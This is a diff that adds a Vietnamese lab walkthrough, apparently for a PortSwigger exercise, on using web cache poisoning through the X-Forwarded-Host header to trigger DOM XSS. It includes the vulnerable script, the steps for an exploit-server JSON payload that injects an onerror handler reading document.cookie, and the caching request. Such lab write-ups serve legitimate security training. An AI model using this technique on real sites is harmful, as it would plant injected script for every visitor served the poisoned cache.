@@ -155,6 +155,49 @@ Tuy nhiên, do trình duyệt sẽ tự động URL encode các ký tự đặc 
 Sau khi submit, kết quả thành công.
 
 # 10. Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
+Trong home page, để ý `Host` header được reflected trong response, sau đó được sử dụng bởi một đoạn script:
+```
+<script>
+data = {
+    "host":"exploit-0ac600400485699884f1b7480126006c.exploit-server.net",
+    "path":"/",
+}
+</script>
+
+...
+
+<script>
+    initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
+</script>
+```
+Khi ta thêm header `X-Forwarded-Host`, reflected value sẽ bị thay đổi, trong khi đó cache vẫn trả về status hit. Như vậy, ta có thể exploit cache poisoning sử dụng header này để website load resources trên exploit server do ta kiểm soát.
+
+Đoạn code xử lý của hàm `initGeoLocate()` như sau:
+```
+function initGeoLocate(jsonUrl)
+{
+    fetch(jsonUrl)
+        .then(r => r.json())
+        .then(j => {
+            let geoLocateContent = document.getElementById('shipping-info');
+
+            let img = document.createElement("img");
+            img.setAttribute("src", "/resources/images/localShipping.svg");
+            geoLocateContent.appendChild(img)
+
+            let div = document.createElement("div");
+            div.innerHTML = 'Free shipping to ' + j.country;
+            geoLocateContent.appendChild(div)
+        });
+}
+```
+Ta thấy, hàm nhận vào một URL với response là một json object. Sau đó, sẽ dùng thuộc tính `country` của object đó để đưa vào `div.innerHTML`. Như vậy ta exploit như sau:
+
++) Vào exploit server, cấu hình một response với body `{"country":"<img src=1 onerror='alert(document.cookie)'>"}`, đặt path là `/resources/json/geolocate.json` với header `Access-Control-Allow-Origin: *`.
+
++) Gửi request với header `X-Forwarded-Host: exploit-0ac600400485699884f1b7480126006c.exploit-server.net`, sau đó submit sao cho response được lưu vào cache.
+
+Khi đó, website thay vì load file `geolocate.json` như thông thường thì sẽ load file của exploit server, khiến cho thẻ `<img...>` được load. Bài lab được giải.
 
 # 11. Combining web cache poisoning vulnerabilities
 
